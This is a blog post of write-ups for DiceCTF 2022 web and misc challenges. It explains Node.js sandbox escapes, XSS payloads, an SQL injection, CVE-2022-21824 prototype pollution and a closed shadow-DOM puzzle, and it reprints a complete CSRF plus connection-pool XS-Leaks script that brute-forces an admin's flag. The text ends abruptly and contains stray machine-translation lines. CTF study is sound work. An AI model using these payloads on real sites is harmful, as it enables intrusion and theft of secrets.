---
title: Various JS and Front-end Tips I Learned from DiceCTF 2022
catalog: true
date: 2022-02-08 20:58:50
tags: [Security, Front-end, JavaScript]
categories: [Security]
---

If you don't know what CTF is, you can refer to my previous article: [How to Get Started with Web Challenges in CTF?](https://blog.techbridge.cc/2021/02/20/web-ctf-is-fun/), which briefly introduces what CTF is and some basic types of challenges.

I played DiceCTF 2021 seriously last year and finally solved 6 web challenges. My experience is here: [DiceCTF 2021 - Summary](https://github.com/aszx87410/ctf-writeups/issues/20). I took a look at this year's DiceCTF and was completely shocked. The difficulty level is completely different.

There are a total of 10 web challenges this time, with 1 easy challenge solved by 365 teams, another relatively simple one solved by 75 teams, and the other 8 challenges solved by only 5 teams or less, with one of them unsolved.

As a person who likes web and JS-related tips, this is a great learning opportunity to learn various techniques through the [writeup](https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ) released after the competition. There won't be notes on all web challenges below, only the ones I'm interested in.

<!-- more -->

## misc/undefined(55 solves)

There is also a JS-related challenge in the misc category this time, and the challenge description is as follows:

> I was writing some Javascript when everything became undefined...
>   
> Can you create something out of nothing and read the flag at /flag.txt? Tested for Node version 17.

The source code looks like this:

``` js
#!/usr/local/bin/node
// don't mind the ugly hack to read input
console.log("What do you want to run?");
let inpBuf = Buffer.alloc(2048);
const input = inpBuf.slice(0, require("fs").readSync(0, inpBuf)).toString("utf8");
inpBuf = undefined;

Function.prototype.constructor = undefined;
(async () => {}).constructor.prototype.constructor = undefined;
(function*(){}).constructor.prototype.constructor = undefined;
(async function*(){}).constructor.prototype.constructor = undefined;

for (const key of Object.getOwnPropertyNames(global)) {
    if (["global", "console", "eval"].includes(key)) {
        continue;
    }
    global[key] = undefined;
    delete global[key];
}

delete global.global;
process = undefined;

{
    let AbortController=undefined;let AbortSignal=undefined;
    let AggregateError=undefined;let Array=undefined;
    let ArrayBuffer=undefined;let Atomics=undefined;
    let BigInt=undefined;let BigInt64Array=undefined;
    let BigUint64Array=undefined;let Boolean=undefined;
    let Buffer=undefined;let DOMException=undefined;
    let DataView=undefined;let Date=undefined;
    let Error=undefined;let EvalError=undefined;
    let Event=undefined;let EventTarget=undefined;
    let FinalizationRegistry=undefined;
    let Float32Array=undefined;let Float64Array=undefined;
    let Function=undefined;let Infinity=undefined;let Int16Array=undefined;
    let Int32Array=undefined;let __dirname=undefined;let Int8Array=undefined;
    let Intl=undefined;let JSON=undefined;let Map=undefined;
    let Math=undefined;let MessageChannel=undefined;let MessageEvent=undefined;
    let MessagePort=undefined;let NaN=undefined;let Number=undefined;
    let Object=undefined;let Promise=undefined;let Proxy=undefined;
    let RangeError=undefined;let ReferenceError=undefined;let Reflect=undefined;
    let RegExp=undefined;let Set=undefined;let SharedArrayBuffer=undefined;
    let String=undefined;let Symbol=undefined;let SyntaxError=undefined;
    let TextDecoder=undefined;let TextEncoder=undefined;let TypeError=undefined;
    let URIError=undefined;let URL=undefined;let URLSearchParams=undefined;
    let Uint16Array=undefined;let Uint32Array=undefined;let Uint8Array=undefined;
    let Uint8ClampedArray=undefined;let WeakMap=undefined;let WeakRef=undefined;
    let WeakSet=undefined;let WebAssembly=undefined;let _=undefined;
    let exports=undefined;let _error=undefined;let assert=undefined;
    let async_hooks=undefined;let atob=undefined;let btoa=undefined;
    let buffer=undefined;let child_process=undefined;let clearImmediate=undefined;
    let clearInterval=undefined;let clearTimeout=undefined;let cluster=undefined;
    let constants=undefined;let crypto=undefined;let decodeURI=undefined;
    let decodeURIComponent=undefined;let dgram=undefined;
    let diagnostics_channel=undefined;let dns=undefined;let domain=undefined;
    let encodeURI=undefined;let encodeURIComponent=undefined;
    let arguments=undefined;let escape=undefined;let events=undefined;
    let fs=undefined;let global=undefined;let globalThis=undefined;
    let http=undefined;let http2=undefined;let https=undefined;
    let inspector=undefined;let isFinite=undefined;let isNaN=undefined;
    let module=undefined;let net=undefined;let os=undefined;let parseFloat=undefined;
    let parseInt=undefined;let path=undefined;let perf_hooks=undefined;
    let performance=undefined;let process=undefined;let punycode=undefined;
    let querystring=undefined;let queueMicrotask=undefined;let readline=undefined;
    let repl=undefined;let require=undefined;let setImmediate=undefined;
    let setInterval=undefined;let __filename=undefined;let setTimeout=undefined;
    let stream=undefined;let string_decoder=undefined;let structuredClone=undefined;
    let sys=undefined;let timers=undefined;let tls=undefined;
    let trace_events=undefined;let tty=undefined;let unescape=undefined;
    let url=undefined;let util=undefined;let v8=undefined;let vm=undefined;
    let wasi=undefined;let worker_threads=undefined;let zlib=undefined;
    let __proto__=undefined;let hasOwnProperty=undefined;let isPrototypeOf=undefined;
    let propertyIsEnumerable=undefined;let toLocaleString=undefined;
    let toString=undefined;let valueOf=undefined;

    console.log(eval(input));
}
```

You can execute any code, but what can you do when almost everything becomes `undefined`?

When I was looking at this challenge, I didn't know what to do. I tried several things that are supposed to be default, such as `module` and `exports`, but they all returned `undefined`. I thought about trying `import`, but it threw an error: `SyntaxError: Cannot use import statement outside a module`.

According to the [author's writeup](https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#miscundefined), there are two solutions to this challenge.

The first solution is that although `import "fs"` doesn't work, `import('fs')` does. I looked at [MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/import), which says: "There is also a function-like dynamic import(), which does not require scripts of type="module"."

So you can solve it like this:

``` js
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```

The other solution is to know some details about Node.js, such as if you write this code:

``` js
console.log("Trying to reach");
return;
console.log("dead code");
```

Because there is no function, you expect the return to fail, but when you run it, you will find that it doesn't fail and it really looks like a function. This is because Node.js modules are actually put into a function. The above code looks like this:

``` js
(function (exports, require, module, __filename, __dirname) {
    console.log("Trying to reach");
    return;
    console.log("dead code");
});
```

Our goal is to get the `require` parameter, but because `arguments` is also `undefined`, we cannot get it directly. We need to get it indirectly. What does this mean? We can first execute a function, and then use `arguments.callee.caller.arguments` to get the parameters of the parent function, like this:

``` js

function wrapper(flag) {
  {
    let flag = null
    let arguments = null
    function inner() {
      console.log(arguments.callee === inner) // true
      console.log(arguments.callee.caller === wrapper) // true
      console.log(arguments.callee.caller.arguments[0]) // I am flag
    }
    inner()
  }
}

wrapper('I am flag')
```

There are two regrets I have about this question. One is that a student asked me about the `return` issue before, and I only said that there was an outer layer of function, but I didn't remember it. As a result, I completely forgot about it.

The second one is the `arguments.callee.caller` operation, which I wrote about two years ago: [I'm weird for thinking JavaScript function is awesome](https://blog.huli.tw/2020/04/18/javascript-function-is-awesome/).

Supplement on 2022-02-09:

Here is another cool solution from [DiceCTF 2022 WriteUps by maple3142](https://blog.maple3142.net/2022/02/07/dicectf-2022-writeups/#undefined). 

Here, the feature of structuredStackTrace in Node.js is used, and a simple POC looks like this:

``` js
function CustomError() {
  const oldStackTrace = Error.prepareStackTrace
  try {
    Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace
    Error.captureStackTrace(this)
    this.stack
  } finally {
    Error.prepareStackTrace = oldStackTrace
  }
}
function trigger() {
  const err = new CustomError()
  for (const x of err.stack) {
    console.log(x.getFunction()+"")
  }
}
trigger()
```

We can use `x.getFunction()` to get the upper function, which is the one that Node.js adds a wrapper to, and then use `arugments` to get the parameters. The official documentation talks about the [Stack trace API](https://v8.dev/docs/stack-trace-api).

And there's one more thing I think is cool. In the POC above, if we put it in the undefined question, we don't have an `Error` to use, so what do we do?

The author of the writeup used this trick:

``` js
try {
	null.f()
} catch (e) {
	TypeError = e.constructor
}
Error = TypeError.prototype.__proto__.constructor
```

That's right! Since we can't get the Error, let's create a TypeError first, and then use the fact that TypeError inherits from Error to get the Error constructor without relying on global. This trick is so cool.

## web/blazingfast(75 solves)

The description of this question is:

> I made a blazing fast MoCkInG CaSe converter!

In short, a converter that converts odd-positioned letters to uppercase was written, and the main code is as follows:

``` js
let blazingfast = null;

function mock(str) {
	blazingfast.init(str.length);

	if (str.length >= 1000) return 'Too long!';

	for (let c of str.toUpperCase()) {
		if (c.charCodeAt(0) > 128) return 'Nice try.';
		blazingfast.write(c.charCodeAt(0));
	}

	if (blazingfast.mock() == 1) {
		return 'No XSS for you!';
	} else {
		let mocking = '', buf = blazingfast.read();

		while(buf != 0) {
			mocking += String.fromCharCode(buf);
			buf = blazingfast.read();
		}

		return mocking;
	}
}

function demo(str) {
	document.getElementById('result').innerHTML = mock(str);
}

WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then(({ instance }) => {	
	blazingfast = instance.exports;

	document.getElementById('demo-submit').onclick = () => {
		demo(document.getElementById('demo').value);
	}

	let query = new URLSearchParams(window.location.search).get('demo');

	if (query) {
		document.getElementById('demo').value = query;
		demo(query);
	}
})
```

The blazingfast.c code is as follows:

``` c
int length, ptr = 0;
char buf[1000];

void init(int size) {
  length = size;
  ptr = 0;
}

char read() {
  return buf[ptr++];
}

void write(char c) {
  buf[ptr++] = c;
}

int mock() {
  for (int i = 0; i < length; i ++) {
    if (i % 2 == 1 && buf[i] >= 65 && buf[i] <= 90) {
      buf[i] += 32;
    }

    if (buf[i] == '<' || buf[i] == '>' || buf[i] == '&' || buf[i] == '"') {
      return 1;
    }
  }

  ptr = 0;

  return 0;
}
```

As long as the content in buf contains `<` and `>`, it will directly return 1, and then the JS layer will return `No XSS for you!`, so it is not easy to execute XSS.

I found the key to this question, but I didn't read the code carefully at the time, which led to a wrong idea, and unfortunately I didn't solve it.

The key is to use some special characters to create length differences, such as the `ß` character, which has a length of 1, but becomes two words after being converted to uppercase:

``` js
'ß'.length // 1
'ß'.toUpperCase().length // 2, becomes SS
```

There are other characters with this feature, and you can fuzz them yourself. Some characters are useful for bypassing length restrictions, such as this article: [Exploiting XSS with 20 characters limitation](https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html), which uses this trick to shorten the length. URLs can also use the same trick, as can be seen in [domain-obfuscator](https://github.com/splitline/domain-obfuscator) or [Unicode Mapping on Domain names](https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names).

Assuming I have a string `ßßßßßßßß<b>1</b>`, the length is 16, so the length will be 16 when initialized, but when it runs to the loop, it will become `8*2+8` = 24 words because it is converted to uppercase, so all 24 words will be written into buf.

In the `mock` function, only the things in the length will be checked, so the last 8 words will not be checked, and `<>` and other characters can be smuggled in, like this:

![](/img/dicectf2022/p1.png)

But because all characters will be converted to uppercase, we need to find an XSS payload that can still be used after being converted to uppercase. At this time, we can use an encoded string, like this:

```
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)" />
```

Here's the translation:

## web/no-cookies(5 solves)

This question is quite interesting. The description is:

> I found a more secure way to authenticate users. No cookies, no problems!

In short, there is a website that asks for your username and password for any operation, and the API will directly bring the username and password, so there is no need for cookies.

The front-end code for this question is as follows:

``` js
(() => {
  const validate = (text) => {
    return /^[^$']+$/.test(text ?? '');
  }

  const promptValid = (text) => {
    let result = prompt(text) ?? '';
    return validate(result) ? result : promptValid(text);
  }

  const username = promptValid('Username:');
  const password = promptValid('Password:');

  const params = new URLSearchParams(window.location.search);

  (async () => {
    const { note, mode, views } = await (await fetch('/view', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username,
        password,
        id: params.get('id')
      })
    })).json();

    if (!note) {
      alert('Invalid username, password, or note id');
      window.location = '/';
      return;
    }

    let text = note;
    if (mode === 'markdown') {
      text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
        return `<a href="${p2}">${p1}</a>`;
      });
      text = text.replace(/#\s*([^\n]+)/g, (match, p1) => {
        return `<h1>${p1}</h1>`;
      });
      text = text.replace(/\*\*([^\n]+)\*\*/g, (match, p1) => {
        return `<strong>${p1}</strong>`;
      });
      text = text.replace(/\*([^\n]+)\*/g, (match, p1) => {
        return `<em>${p1}</em>`;
      });
    }

    document.querySelector('.note').innerHTML = text;
    document.querySelector('.views').innerText = views;
  })();
})();
```

The part that parses Markdown looks like it can be XSS:

``` js
text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
        return `<a href="${p2}">${p1}</a>`;
      });
```

Afterwards, the author said that he didn't intend to leave a loophole here, but GitHub copilot wrote it out XD, but he thought it was interesting and left it.

This XSS loophole is not difficult to find:

``` js
var text = '[abc](123" onfocus=alert`1` autofocus=")'
text = text.replace(/\[([^\]]+)\]\(([^\)]+)\)/g, (match, p1, p2) => {
  return `<a href="${p2}">${p1}</a>`;
});
console.log(text)
// <a href="123" onfocus=alert`1` autofocus="">abc</a>
```

But the problem is, once you have XSS, how do you steal the password (which is the flag for this question)?

At the time, I couldn't figure out how to steal the password, but after the competition, I saw the writeup and learned about a magical attribute: [RegExp.input](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/input). This attribute can get the last input of the RegExp, for example:

``` js
/a/.test('secret password')
console.log(RegExp.input) // secret password
```

And the password is the last input that was thrown into `/^[^$']+$/.test()`, so you can get the password through this. This is really mind-blowing.

But there is a detail here. If you use Markdown XSS, the regexp that is finally matched is not the password, so you can't get it. At this point, you must find the server's SQL injection. The code is as follows:

``` js
const db = {
  prepare: (query, params) => {
    if (params)
      for (const [key, value] of Object.entries(params)) {
        const clean = value.replace(/['$]/g, '');
        query = query.replaceAll(`:${key}`, `'${clean}'`);
      }
    return query;
  },
  get: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).get();
    } catch {}
  },
  run: (query, params) => {
    const prepared = db.prepare(query, params);
    try {
      return database.prepare(prepared).run();
    } catch {}
  },
};

const id = crypto.randomBytes(16).toString('hex');
db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', {
  id,
  username,
  note: note.replace(/[<>]/g, ''),
  mode,
});
```

It removes all single quotes and $, and then replaces all `:param`. You can use this feature to inject, for example (from DrBrix):

```
"username": "a :note",
"password": "pass"
"note": ", :mode, 0, 0) -- ",
"mode": "actual note and xss"
```

Let's see what it looks like in the end:

``` sql
// 一開始是
INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)

// 接著假設 id 是 123，就會變成
INSERT INTO notes VALUES ('123' :username, :note, :mode, 0)

// 再來 replace username，變成
INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0)

// 再來是 note，要注意的是兩個 note 都會被 replace
INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0)

// 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制
INSERT INTO notes VALUES ('123', 'a ', 'payload', 0, 0) -- '', ', 'payload', 0, 0) -- ', :mode, 0)
```

Using this loophole, you can do XSS without relying on Markdown, and then use the magical attribute `RegExp.input` to get the password.

### Unexpected solution

The unexpected solution for this question is also super cool. You don't need `RegExp.input` anymore. The feature used is this piece of code:

``` js
document.querySelector('.note').innerHTML = text;
document.querySelector('.views').innerText = views;
```

You might expect that after inserting HTML, it will continue to execute and then execute the content inside the HTML, for example:

``` html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<img src=x onerror=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

The displayed alert will be `updated`. The event of the img is indeed executed later, but if it is written like this, it will be different:

``` html
<div id=x></div>
<div id=y>hello</div>
<script>
    x.innerHTML = '<svg><svg onload=alert(window.y.innerText)>'
    y.innerText = 'updated'
</script>
```

If written like this, the content in `onload` will be executed before `y.innerText = 'updated'`, so the content of the alert will be `hello`. This payload is also recorded in [tinyXSS](https://github.com/terjanq/Tiny-XSS-Payloads):

``` html
<!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM -->
<svg><svg/onload=eval(name)>
```

So what can we do with this knowledge?

Let's first organize the code that loads the notes. After simplification, it looks like this:

``` js
(async () => {
  const { note, mode, views } = await (await fetch('/view', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username,
      password,
      id: params.get('id')
    })
  })).json();

  document.querySelector('.note').innerHTML = text;
  // 在底下這行執行之前，會先執行我們的 XSS payload
  document.querySelector('.views').innerText = views;
})();
```

Now, if we can execute the code before the last line, we can do some interesting things.

We can first overwrite `document.querySelector`, and then overwrite `JSON.stringify`, like this:

``` js
document.querySelector = function() {
  JSON.stringify = function(data) {
    
  }
}
```

After overriding, what can we do? After overriding, we can use `arguments.callee.caller` to access the outermost anonymous async function and then call it again! After calling it again, another request will be sent, and we can intercept the password by using `JSON.stringify`:

``` js
document.querySelector = function() {
  JSON.stringify = function(data) {
    console.log(data.password) // flag
  };
  arguments.callee.caller()
}
```

This unexpected solution comes from [@dr_brix](https://twitter.com/dr_brix), which is really cool. I never thought it could be done this way.

## web/vm-calc(2 solves)

Adding a calculation function is a common type of problem in CTF. At first glance, it seems to be a VM escape, and the core code is as follows:

``` js
const { NodeVM } = require('vm2');
const vm = new NodeVM({
    eval: false,
    wasm: false,
    wrapper: 'none',
    strict: true
});

app.post("/", (req, res) => {
    const { calc } = req.body;

    if(!calc) {
        return res.render("index");
    }

    let result;
    try {
        result = vm.run(`return ${calc}`);
    }
    catch(err) {
        console.log(err);
        return res.render("index", { result: "There was an error running your calculation!"});
    }

    if(typeof result !== "number") {
        return res.render("index", { result: "Nice try..."});
    }

    res.render("index", { result });
});
```

The code that can get the flag is this:

``` js
app.post("/admin", async (req, res) => {
    let { user, pass } = req.body;
    if(!user || !pass || typeof user !== "string" || typeof pass !== "string") {
        return res.render("admin", { error: "Missing username or password!" });
    }

    let hash = sha256(pass);
    if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
        res.render("admin", { flag: await fsp.readFile("flag.txt") });
    }
    else {
        res.render("admin", { error: "Incorrect username or password!" });
    }
});
```

Regarding VM escape, all I know is based on this file: https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af

There are some interesting ways in it, such as this:

``` js
////////
// Also, the vm code could throw an exception, with proxies on it.

const code5 = `throw new Proxy({}, {
  get: function(me, key) {
	 const cc = arguments.callee.caller;
	 if (cc != null) {
		(cc.constructor.constructor('console.log(sauce)'))();
	 }
	 return me[key];
  }
})`;


try {
  vm.runInContext(code5, vm.createContext(Object.create(null)));
}
catch(e) {
  // The following prints out 'laser' twice, (as side-effects of e
  // being converted to a string) followed by {}, which is the effect
  // of the console.log actually *on* this line printing out the
  // stringified value of the exception, which is in this case a
  // (proxy-wrapped) empty object.
  console.log(e);
}
```

Throw a proxy out as an exception, and when someone executes toString on this exception, it will trigger and we can get the external function through `arguments.callee.caller`.

However, this problem is not about finding a vm2 0 day, but about using a Node.js 1 day to bypass this:

``` js
if(users.filter(u => u.user === user && u.pass === hash)[0] !== undefined) {
    res.render("admin", { flag: await fsp.readFile("flag.txt") });
}
```

I think this bypass is also very powerful. Normally, `users.filter` will return an empty array because no conditions are met, so the length is usually checked. Here, however, the first element of the array is checked to see if it is undefined.

This is because if there is a prototype pollution vulnerability, we can pollute the first property of the array, and `[][0]` will have something, which will make the if statement true.

And this vulnerability is numbered [CVE-2022-21824](https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824), and the way to use it is:

``` js
console.table([{x:1}], ["__proto__"]);
```

The first parameter of this API is the data, and the second parameter is the field to be displayed, like this:

![](/img/dicectf2022/p2.png)

The fixed commit is this one: https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b

From this, we can see that the problem is with the `map` object. Let's take a closer look at the key part of the `console.table` code: [lib/internal/console/constructor.js](https://github.com/nodejs/node/blob/3454e797137b1706b11ff2f6f7fb60263b39396b/lib/internal/console/constructor.js#L482)

``` js
// tabularData 是第一個參數 [{x:1}]
// properties 是第二個參數 ["__proto__"]
const map = ObjectCreate(null);
let hasPrimitives = false;
const valuesKeyArray = [];
const indexKeyArray = ObjectKeys(tabularData);

for (; i < indexKeyArray.length; i++) {
  const item = tabularData[indexKeyArray[i]];
  const primitive = item === null ||
      (typeof item !== 'function' && typeof item !== 'object');
  if (properties === undefined && primitive) {
    hasPrimitives = true;
    valuesKeyArray[i] = _inspect(item);
  } else {
    const keys = properties || ObjectKeys(item);
	
    // for of 的時候 key 會是 __proto__ 
    for (const key of keys) {
      if (map[key] === undefined)
        map[key] = [];
      
      // !ObjectPrototypeHasOwnProperty(item, key) 會成立
      if ((primitive && properties) ||
           !ObjectPrototypeHasOwnProperty(item, key))

        // 因此 map[__proto__][0] 會是空字串
        map[key][i] = '';
      else
        map[key][i] = _inspect(item[key]);
    }
  }
}
```

So through this method, we can pollute `Object.prototype[0]` and make it an empty string.

It seems that we should follow Node.js security updates, and there are many useful information.

## web/noteKeeper(2 solves)

I didn't look at this problem carefully at the time, so I put it aside for future study: https://brycec.me/posts/dicectf_2022_writeups#notekeeper

## web/dicevault(2 solves)

I didn't look at this problem carefully either, I only knew it was a tribute to another problem: http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html

Author's answer: https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ#webdicevault

## web/carrot(1 solves)

This is also an interesting question, a very simple service that allows you to add notes and search, as shown below:

![](/img/dicectf2022/p3.png)

When searching, it will search the content and display it if it exists. The backend code is as follows:

``` py
@app.route('/tasks')
def tasks():
    if 'username' not in session:
        return redirect('/')

    tasks = db.get(session['username'])['tasks']

    if 'search' in request.args:
        search = request.args['search']
        tasks = list(filter(lambda task: search in task['content'], tasks))

    tasks = list(sorted(tasks, key=lambda task: -task['priority']))

    return render_template('tasks.html', tasks=tasks)
```

The flag is hidden in the admin note and will be automatically created when started:

``` py
if not has('admin'):
	password = config.ADMIN_PASSWORD
	
	put('admin', {
		'tasks': [{
			'title': 'flag',
			'content': os.getenv('FLAG', default='dice{flag}'),
			'priority': 1,
			'id': 0
		}],
		'password': bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode('utf-8')
	})
```

From the behavior of the admin bot and other observations, it seems to be an XS-Leaks problem. As long as you can observe whether the search result has a flag, it is enough, but the difficulty lies in not being able to figure out how to observe.

The official did not release this question and it seems that the answer will not be released (since it is not released, it may be a Chrome 0 day or an unrepaired bug?), but someone provided an XS-Leaks exploit after the game: https://gist.github.com/kunte0/47c2b53535605d842f984e77d6c63eed

Complete code:

``` html
<h1>DiceCTF 2022 web/carrot</h1>

<p>Step 1: CSRF the admin user, to set a super long title for the flag note (LAX + POST form only possible for 2 minutes after cookies is created)</p>
<button onclick="csrf()">do csrf</button>
<p>Step 2: XS-Search with <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">connection-pool timing leak</a>, we have to use window.open (LAX cookie)</p>

<button onclick="popunder()">open popup</button>
<button onclick="exhaust_sockets()">open 255 connections</button>
<button onclick="oracle('dice{abc')">test search "abc" (slow)</button>
<button onclick="oracle('dice{xxx')">test search "xxx" (fast)</button>
<br>
<br>
<h2 id=output></h2>
<br>
<form id=x action="" method="POST" style="display:none;">
	<input type="text" name="title" placeholder="title">
	<br><br>
	<input type="number" name="priority" placeholder="priority" value=9999>
	<br><br>
	<textarea name="content" placeholder="content" rows="5" cols="20"></textarea>
	<br><br>
	<input type="submit" value="submit">
</form>

<script>

// this is send is used as logging
LOG = 'Starting'
// 255 in normal chrome, 99 in headless
SOCKETLIMIT = 255;
// default
TIMELIMIT = 800;
INSTANCE = ''
MYSERVER = `example.com`

const sleep = (ms) => {
    return new Promise(resolve => {
        setTimeout(resolve, ms);
    });
}

const time_fetch = async() => {
    let test_server_url = `https://${MYSERVER}/?${LOG}`;
    let start = window.performance.now();
    try {
        await fetch(test_server_url, {
            mode: 'no-cors'
        });
    } catch (e) {
        console.log(e);
    }
    let end = window.performance.now();
    return end - start;
}

const fetch_sleep_long = (i) => {
    // 40s sleep
    return fetch(`https://${i}.${MYSERVER}/40sleep`, {
        mode: 'no-cors'
    });
}

const fetch_sleep_short = (i) => {
    // 0.25s sleep
    return fetch(`https://${i}.${MYSERVER}/ssleep`, {
        mode: 'no-cors'
    });
}

const block_socket = async (i) => {
    fetch_sleep_long(i);
    // needed?
    await sleep(0);
}

const exhaust_sockets = async() => {
    let i = 0
    for (; i < SOCKETLIMIT; i++) {
        block_socket(i);
    }
    console.log(`Used ${i} connections`);
}

const timeit = async (url, popup) => {
    return new Promise(async (r) => {

        popup.location = url;
        // needed?
        await sleep(50)

        let val = await time_fetch()
        r(val)
    });
}

// const alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-}!"#$%&\'()*+,-./:;<=>?@[\\]^`|~{'.split('');
const alphabet = 'abcdefghijklmnopqrstuvwxyz}_'.split('');
// const alphabet = 'abcdef}'.split('');

const oracle = async (search) => {
    let url = `https://carrot-${INSTANCE}.mc.ax/tasks?search=${search}`
    let t = await timeit(url, WINBG)

    LOG = `${search}:${t}`
    console.log(`${search}:${t}`)

    return t > TIMELIMIT 
}

const brute = async (flag) => {
    for (const char of alphabet) {
        if (await oracle(flag + char)) {
            return char;
        }
    }
    return false;
}

const calibrate = async () => {
    return new Promise(async (r) => {
        // slow
        let url1 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=dice{`
        let t1 = await timeit(url1, WINBG)
        console.log(`slow:${t1}`)
        // fast
        let url2 = `https://carrot-${INSTANCE}.mc.ax/tasks?search=XXXXXXXXXX`
        let t2 = await timeit(url2, WINBG)
        console.log(`fast:${t2}`)
        return r((t1 + t2) / 2)
    });

}

const exploit = async(flag = '') => {
    console.log('Starting')
    // dont go to fast plz :) 
    console.log(`waiting 3s`)
    await sleep(3000)
    // exaust sockets
    await exhaust_sockets()
    await sleep(2000)
    LOG = `Calibrating`
    TIMELIMIT = await calibrate()
    LOG = `TIMELIMIT:${TIMELIMIT}`
    console.log(`timelimit:${TIMELIMIT}`)
    await sleep(2000)
    let last;
    while (true) {
        last = await brute(flag);
        if (last === false) {
            return flag;
        } 
        else {
            flag += last;
            output.innerText = flag;
            if(last === '}'){
                return flag
            }
        }
    }
}

const popunder = () => {
    if (window.opener) {
            WINBG = window.opener
    } 
    else {
        WINBG = window.open(location.href, target="_blank")
        location = `about:blank`
    }
}

const csrf = async () => {
    x.action = `https://carrot-${INSTANCE}.mc.ax/edit/0`
    x.title.value = "A".repeat(1000000)
    x.submit()
}

window.onload = () => {
    let p = new URL(location).searchParams;
    if(!p.has('i')){
        console.log(`no INSTANCE`)
        return
    }
    INSTANCE = p.get('i')
    // step 1 
    if(p.has('csrf')){
        csrf()
        return
    }
    // step 2
    if (p.has('exploit')) {
        // window open is ok in headless :)
        popunder()
        
        exploit('dice{')
    }
}
</script>
```

In short, you can first use CSRF to change the title of the admin note to a super long string. Because jinja2 render will slow down, the response time will increase.

Then it is a timing attack. The exploit above uses [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/). First, stuff the browser's connection pool with only one left, and then use a new window to visit the search URL (let's call it reqSearch). At the same time, send a request to our own server (we call it reqMeasure). Because only one connection can be used, the time from sending the request to receiving the response of reqMeasure is the time spent by reqSearch + the time spent by reqMeasure. Assuming that the time spent by reqMeasure is similar, we can easily measure the time spent by reqSearch.

After measuring the time, you can slowly brute force the content of the flag.

## web/shadow(0 solves)

This is a pure front-end problem. Let's take a look at the code:

``` html
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <title>shadow</title>
  </head>
  <body>
    <h3 id="title">store your secrets here:</h3>
    <div id="vault"></div>
    <div id="xss"></div>
    <script>
      // the admin has the flag set in localStorage["secret"]
      let secret = localStorage.getItem("secret") ?? "dice{not_real_flag}"
      let shadow = window.vault.attachShadow({ mode: "closed" });
      let div = document.createElement("div");
      div.innerHTML = `
          <p>steal me :)</p>
          <!-- secret: ${secret} -->
      `;
      let params = new URL(document.location).searchParams;
      let x = params.get("x");
      let y = params.get("y");
      div.style = y;
      shadow.appendChild(div);
      secret = null;
      localStorage.removeItem("secret");
      shadow = null;
      div = null;
      
      // free XSS
      window.xss.innerHTML = x;
    </script>
  

</body></html>
```

A closed shadow DOM is created, and you are asked to find a way to access the content inside. According to [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Element/attachShadow#parameters), closed means:

> closed: Denies access to the node(s) of a closed shadow root from JavaScript outside it:

So JavaScript cannot directly access the code, and no matter how you query, it will be null.

Therefore, the key to this question is a deliberately left style injection: `div.style = y;`, and you can add some CSS.

When doing this question, I thought that maybe using [Houdini](https://developer.mozilla.org/en-US/docs/Web/Guide/Houdini) and implementing some custom CSS properties or layout rules could get the DOM, but because of CSP and execution order, it should not be possible.

Later, because no one solved this question for a long time, the organizers released a hint: "Hint 1: non-standard css properties might help you."

After seeing this, I went to Google: `non-standard css properties`, and found this: [Non-standard and Obsolete CSS Properties](https://gist.github.com/ryboe/bb95223148e486acbe7a), and actually tried several properties in it, but they were not helpful.

At this point, I suddenly became curious about which CSS properties Chrome actually supports, so I went directly to the source code to see it and found this: https://chromium.googlesource.com/chromium/blink/+/refs/heads/main/Source/core/css/CSSProperties.in

I will now translate the Markdown content you provided:

---

I looked through the CSS properties one by one, and found `-webkit-user-modify`, which led me to MDN: https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify

It looks like this property is similar to `contenteditable`. Since it has become `contenteditable`, I naturally thought of [document.execCommand](https://developer.mozilla.org/zh-TW/docs/Web/API/Document/execCommand), which has an `insertHTML` command that looks promising.

So I tried various things on the console, such as `document.execCommand('insertHTML',false,'<img src=x onerror=console.log(this.parentNode)')`, but the console displayed `null`. I thought it might not be the right solution, so I gave up.

After reading the writeup: [https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md), I found that my direction was completely correct, but there were two key points that I missed.

